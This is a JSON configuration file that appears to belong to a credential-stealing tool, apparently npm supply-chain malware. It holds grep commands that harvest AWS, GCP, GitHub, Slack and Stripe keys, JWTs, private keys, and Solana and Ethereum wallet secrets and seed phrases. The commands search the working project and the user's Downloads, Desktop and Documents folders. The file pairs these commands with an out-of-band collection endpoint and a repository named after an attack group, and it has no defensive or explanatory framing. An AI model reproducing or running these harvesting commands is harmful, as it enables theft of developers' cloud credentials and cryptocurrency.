{"commands":{"aws":"grep -rE 'AKIA[0-9A-Z]{16}|aws_secret_access_key|AWS_SECRET_ACCESS_KEY' --include='*.{env,json,yaml,yml,tf,py,js,ts,sh}' . 2>/dev/null | head -50","gcp":"grep -rE 'type:\\s*service_account|private_key_id|client_secret|GOOGLE_APPLICATION_CREDENTIALS|AIza[0-9A-Za-z_-]{35}' --include='*.{json,env,yaml,yml,tf}' . 2>/dev/null | head -50","solana":"grep -rE '[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{87,88}|mnemonic|seed.?phrase|PRIVATE_KEY|private_key|secret.?key|solana' --include='*.{json,env,txt,md,cfg}' . 2>/dev/null | grep -v 'node_modules|package-lock' | head -50","ethereum":"grep -rE '0x[a-fA-F0-9]{64,66}|mnemonic|seed.?phrase|PRIVATE_KEY|private_key' --include='*.{json,env,txt,md,cfg,py,js,ts}' . 2>/dev/null | grep -v 'node_modules|package-lock' | head -50","crypto":"grep -rE '(PRIVATE|PRIVATE_KEY|secret|mnemonic|seed|passphrase|wallet|private_key|BASE58)[^a-zA-Z]{1}[A-Za-z0-9+/=_:;,\\-]{20,200}' --include='*.{json,env,txt,md,cfg,py,js,ts,sh}' . 2>/dev/null | grep -v 'node_modules|package-lock|public/' | head -50","all":"grep -RIsE --binary-files=without-match \\\n--exclude-dir=.git --exclude-dir=node_modules --exclude-dir=dist --exclude-dir=build --exclude-dir=coverage --exclude-dir=.next --exclude-dir=.cache --exclude-dir=vendor --exclude-dir=tmp --exclude-dir=.terraform --exclude-dir=.venv --exclude-dir=venv --exclude-dir=__pycache__ --exclude-dir=target --exclude-dir=bin --exclude-dir=obj --exclude-dir=logs --exclude-dir=images --exclude-dir=assets --exclude-dir=public --exclude-dir=.go --exclude-dir=go --exclude-dir=.cargo --exclude-dir=.rustup --exclude-dir=.gradle --exclude-dir=.m2 --exclude-dir=.npm --exclude-dir=.yarn --exclude-dir=.pnpm --exclude-dir=.local --exclude-dir=.Trash --exclude-dir=Library \\\n--exclude='*.css' --exclude='*.scss' --exclude='*.sass' --exclude='*.less' \\\n--exclude='*.html' --exclude='*.htm' --exclude='*.xml' \\\n--exclude='README*' --exclude='CHANGELOG*' --exclude='LICENSE*' --exclude='*.md' \\\n--exclude='*.png' --exclude='*.jpg' --exclude='*.jpeg' --exclude='*.gif' --exclude='*.webp' --exclude='*.svg' --exclude='*.ico' \\\n--exclude='*.mp4' --exclude='*.mov' --exclude='*.avi' --exclude='*.mkv' \\\n--exclude='*.mp3' --exclude='*.wav' --exclude='*.ogg' \\\n--exclude='*.zip' --exclude='*.tar' --exclude='*.gz' --exclude='*.rar' --exclude='*.7z' \\\n--exclude='*.pdf' --exclude='*.doc' --exclude='*.docx' --exclude='*.xls' --exclude='*.xlsx' \\\n--exclude='*.log' --exclude='*.lock' \\\n--exclude='package-lock.json' --exclude='yarn.lock' --exclude='pnpm-lock.yaml' --exclude='composer.lock' --exclude='Gemfile.lock' --exclude='Cargo.lock' --exclude='go.sum' \\\n'(gh[pousr]_[A-Za-z0-9]{30,255}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z\\-_]{35}|xox[baprs]-[0-9A-Za-z\\-]{20,}|sk_live_[0-9A-Za-z]{24}|rk_live_[0-9A-Za-z]{24}|-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----|0x[a-fA-F0-9]{64}|\\[[0-9]{1,3}(,[0-9]{1,3}){63}\\]|[1-9A-HJ-NP-Za-km-z]{32,44}|eyJ[A-Za-z0-9_\\-]{20,}\\.[A-Za-z0-9_\\-]{20,}\\.[A-Za-z0-9_\\-]{20,})' \\\n~/Downloads ~/Desktop ~/Documents 2>/dev/null"},"endpoint":"https://ahlbtggbruiaxmzacqwmyf6lz4pvn50g3.oast.fun","repo":"Lapsus-Network/npmpack-lab"}